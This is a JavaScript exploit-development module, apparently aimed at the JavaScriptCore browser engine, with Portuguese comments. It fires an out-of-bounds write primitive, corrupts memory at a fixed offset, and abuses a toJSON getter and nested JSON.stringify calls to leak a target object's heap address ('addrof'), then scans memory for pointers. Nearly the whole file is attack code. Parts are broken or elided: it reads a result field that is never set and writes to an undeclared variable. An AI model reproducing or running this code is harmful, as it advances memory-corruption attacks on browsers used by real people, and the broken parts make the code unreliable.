// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForStringifierAddrOfLeak";
let getter_called_flag = false;
let current_test_results = {
    success: false, message: "Teste não iniciado.", error: null,
    leaked_pointers_in_json_string: [],
    leaked_pointers_in_oob_ab: []
};

const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const OOB_AB_FILL_PATTERN_FOR_LEAK_TEST = 0xFEFEFEFE;
const OOB_AB_SNOOP_SIZE_FOR_LEAK_TEST = 0x400; // Sondar 1KB

let object_whose_address_we_want_to_leak; // Definido no runner

class CheckpointForStringifierAddrOfLeak {
    constructor(id) {
        this.id_marker = `StrAddrLeakChkpt-${id}`;
        this.some_data = "Checkpoint Data String"; // Para dar corpo ao objeto
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "StringifierAddrOfLeak_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        current_test_results = { // Reset
            success: false, message: "Getter chamado, tentando vazar endereço via Stringifier.",
            error: null, leaked_pointers_in_json_string: [], leaked_pointers_in_oob_ab: [], details:""
        };
        let details_log = [];
        let leak_found = false;

        try {
            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
                throw new Error("Dependências OOB ou oob_ab não disponíveis.");
            }

            // 1. Preencher oob_array_buffer_real com um padrão
            const fill_limit = Math.min(OOB_AB_SNOOP_SIZE_FOR_LEAK_TEST, oob_array_buffer_real.byteLength);
            logS3(`DENTRO DO GETTER: Preenchendo oob_ab de 0 a ${toHex(fill_limit)} com ${toHex(OOB_AB_FILL_PATTERN_FOR_LEAK_TEST)}...`, "info", FNAME_GETTER);
            for (let offset = 0; offset < fill_limit; offset += 4) {
                if (offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8) continue;
                try { oob_write_absolute(offset, OOB_AB_FILL_PATTERN_FOR_LEAK_TEST, 4); } catch(e_fill) {}
            }
            details_log.push(`oob_ab preenchido com padrão.`);

            // 2. Criar o objeto de stress que contém a referência ao objeto cujo endereço queremos
            //    object_whose_address_we_want_to_leak já foi criado no runner.
            if (!object_whose_address_we_want_to_leak) {
                details_log.push("ERRO: object_whose_address_we_want_to_leak não está definido globalmente!");
                throw new Error("Objeto alvo global para leak não definido.");
            }

            let stress_container_for_leak = {
                id: "StressContainerForLeak",
                target_object_prop: object_whose_address_we_want_to_leak,
                padding_string_A: "PaddingA_" + "P".repeat(128) + "_EndPaddingA",
                padding_array: [1,2,3, object_whose_address_we_want_to_leak, 5,6,7],
                padding_string_B: "PaddingB_" + "Q".repeat(128) + "_EndPaddingB",
            };
            details_log.push(`Stress container criado, contém referência a object_whose_address_we_want_to_leak (id: ${object_whose_address_we_want_to_leak.unique_id}).`);

            // 3. Chamar JSON.stringify internamente no stress_container_for_leak
            logS3("DENTRO DO GETTER: Chamando JSON.stringify INTERNO sobre stress_container_for_leak...", "subtest", FNAME_GETTER);
            let internal_json_output = "";
            try {
                internal_json_output = JSON.stringify(stress_container_for_leak);
                details_log.push(`Stringify interno completado. Output length: ${internal_json_output.length}.`);
                logS3(`DENTRO DO GETTER: JSON.stringify interno output (parcial): ${internal_json_output.substring(0, 200)}...`, "info", FNAME_GETTER);

                // 3a. Procurar por ponteiros no output string JSON
                // Esta é uma heurística. Um ponteiro real seria 0xHHHHLLLL.
                const hex_ptr_regex = /0x[0-9a-fA-F]{8,16}/g; // Procura por "0x" seguido de 8 a 16 dígitos hex
                let matches = internal_json_output.match(hex_ptr_regex);
                if (matches) {
                    details_log.push(`Potenciais ponteiros encontrados na string JSON: ${matches.join(', ')}`);
                    logS3(`POTENCIAIS PONTEIROS ENCONTRADOS NA STRING JSON: ${matches.join(', ')}`, "leak", FNAME_GETTER);
                    current_test_results.leaked_pointers_in_json_string = matches;
                    leak_found = true;
                }

            } catch (e_json_int) {
                details_log.push(`Erro no JSON.stringify interno: ${e_json_int.message}`);
                logS3(`DENTRO DO GETTER: Erro no JSON.stringify interno: ${e_json_int.message}`, "error", FNAME_GETTER);
                current_test_results.error = (current_test_results.error || "") + ` ErrStrfyInt: ${e_json_int.message}`;
            }

            // 4. Sondar o oob_array_buffer_real por escritas/vazamentos
            logS3("DENTRO DO GETTER: Sondando oob_array_buffer_real por alterações/ponteiros...", "info", FNAME_GETTER);
            for (let offset = 0; (offset + 8) <= fill_limit; offset += 4) { // Passo de 4, mas analisa como 8 para ponteiros
                 let skip_offset = false;
                if (offset >= CORRUPTION_OFFSET_TRIGGER && offset < CORRUPTION_OFFSET_TRIGGER + 8) {
                     skip_offset = true; 
                     try {
                        const val_trig_u32 = oob_read_absolute(offset, 4);
                        if (val_trig_u32 !== OOB_AB_FILL_PATTERN_FOR_LEAK_TEST) {
                             current_test_results.leaked_pointers_in_oob_ab.push({offset: toHex(offset), value: toHex(val_trig_u32), note: "Trigger Area"});
                        }
                     } catch(e){}
                }
                if(skip_offset) continue;

                try {
                    const value_u32_check = oob_read_absolute(offset, 4);
                    if (value_u32_check !== OOB_AB_FILL_PATTERN_FOR_LEAK_TEST) {
                        const val64_check = oob_read_absolute(offset, 8); // Ler o QWORD para contexto
                        const leak_info_oob = `ALTERAÇÃO/LEAK oob_data[${toHex(offset)}] = ${val64_check.toString(true)} (Esperado DWORD: ${toHex(OOB_AB_FILL_PATTERN_FOR_LEAK_TEST)})`;
                        logS3(leak_info_oob, "leak", FNAME_GETTER);
                        current_test_results.leaked_pointers_in_oob_ab.push({offset: toHex(offset), value: val64_check.toString(true), note: "Data Changed"});
                        leak_found = true;
                        // Heurística de ponteiro
                        if ((val64_check.high() > 0x0001 && val64_check.high() < 0x8000)) {
                            logS3(`  -> VALOR SUSPEITO DE PONTEIRO (oob_ab)!`, "vuln", FNAME_GETTER);
                        }
                    }
                } catch (e_snoop) {}
            }
            if (current_test_results.leaked_pointers_in_oob_ab.length > 0) {
                 details_log.push(`${current_test_results.leaked_pointers_in_oob_ab.length} alterações/leaks potenciais no oob_ab.`);
            }


            if (leak_found) {
                current_test_results.success = true;
                current_test_results.message = "Potencial vazamento de informação detectado (na string JSON ou no oob_ab)!";
            } else {
                current_test_results.message = "Nenhum vazamento óbvio detectado ao estressar Stringifier com objeto alvo.";
            }
            current_test_results.details = details_log.join('; ');

        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL NO GETTER: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results.error = String(e_getter_main);
            current_test_results.message = `Erro principal no getter: ${e_getter_main.message}`;
        }
        return { "getter_processed_stringifier_addrof_leak_test": true };
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForStringifierAddrOfLeak.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_str_addrof_leak_test: true };
    }
}

export async function executeRetypeOOB_AB_Test() { 
    const FNAME_TEST_RUNNER = "executeStringifierAddrOfLeakTestRunner";
    logS3(`--- Iniciando Teste de AddrOf via Stringifier Corrompido ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    current_test_results = { /* Reset inicial */ };
    object_whose_address_we_want_to_leak = null; // Resetar global

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { return; }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        
        // Criar o objeto alvo ANTES do gatilho, para que seu endereço esteja "no heap"
        object_whose_address_we_want_to_leak = { "secret_id_global": 0xFEEDFACE + Math.floor(Math.random()*255), "unique_data_global": Date.now() };
        logS3(`Objeto alvo global para addrof criado: ID=${object_whose_address_we_want_to_leak.secret_id_global}`, "info", FNAME_TEST_RUNNER);

        // Escrita OOB Gatilho
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

        const checkpoint_obj = new CheckpointForStringifierAddrOfLeak(1);
        // A propriedade que contém o objeto alvo é definida no construtor do Checkpoint ou dinamicamente
        // Aqui, vamos assumir que o getter usará a variável global `object_whose_address_we_want_to_leak`.
        // No teste anterior, era atribuído a checkpoint_obj.prop_to_leak_via_stringify. 
        // Para este teste, o getter cria o `stress_container_for_leak` que referencia o global.
        logS3(`Checkpoint objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        let final_json_output_runner = "";
        try {
            final_json_output_runner = JSON.stringify(checkpoint_obj);
            logS3(`JSON.stringify EXTERNO completado. Resultado (parcial): ${final_json_output_runner.substring(0,200)}...`, "info", FNAME_TEST_RUNNER);
            // Verificar se a string falsa (ou um ponteiro) apareceu no output do JSON.stringify EXTERNO
            if (typeof current_test_results.stringify_output_getter === 'string' && current_test_results.stringify_output_getter.match(/0x[0-9a-fA-F]{8,16}/g)) {
                current_test_results.success = true;
                current_test_results.message += " String JSON interna continha formato de ponteiro!";
                 logS3("String JSON INTERNA continha formato de ponteiro!", "vuln", FNAME_TEST_RUNNER);
            } else if (final_json_output_runner.match(/0x[0-9a-fA-F]{8,16}/g)) {
                current_test_results.success = true;
                current_test_results.message += " String JSON EXTERNA continha formato de ponteiro!";
                 logS3("String JSON EXTERNA continha formato de ponteiro!", "vuln", FNAME_TEST_RUNNER);
            }


        } catch (e_json_ext) { /* ... */ }

    } catch (mainError_runner) { /* ... */ }
    finally { /* ... */ }

    // Log dos resultados
    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE ADDR_OF STRINGIFIER: SUCESSO ESPECULATIVO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
        } else {
            logS3(`RESULTADO TESTE ADDR_OF STRINGIFIER: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
        }
        if (current_test_results.details) {
             logS3(`  Detalhes da tentativa no getter: ${current_test_results.details}`, "info", FNAME_TEST_RUNNER);
        }
        if (current_test_results.leaked_pointers_in_json_string && current_test_results.leaked_pointers_in_json_string.length > 0) {
            logS3("--- Potenciais Ponteiros na String JSON Interna ---", "leak", FNAME_TEST_RUNNER);
            current_test_results.leaked_pointers_in_json_string.forEach(ptr_str => {
                logS3(`  ${ptr_str}`, "leak", FNAME_TEST_RUNNER);
            });
        }
        if (current_test_results.leaked_pointers_in_oob_ab && current_test_results.leaked_pointers_in_oob_ab.length > 0) {
            logS3("--- Potenciais Ponteiros/Alterações no oob_array_buffer_real ---", "leak", FNAME_TEST_RUNNER);
            current_test_results.leaked_pointers_in_oob_ab.forEach(item => {
                logS3(`  Offset ${item.offset}: ${item.value} ${item.note ? '('+item.note+')':''}`, "leak", FNAME_TEST_RUNNER);
            });
        }
         if (current_test_results.error) { /* ... */ }
    } else { /* ... */ }

    clearOOBEnvironment();
    global_target_object_for_leak = null;
    logS3(`--- Teste de AddrOf via Stringifier Corrompido Concluído ---`, "test", FNAME_TEST_RUNNER);
}
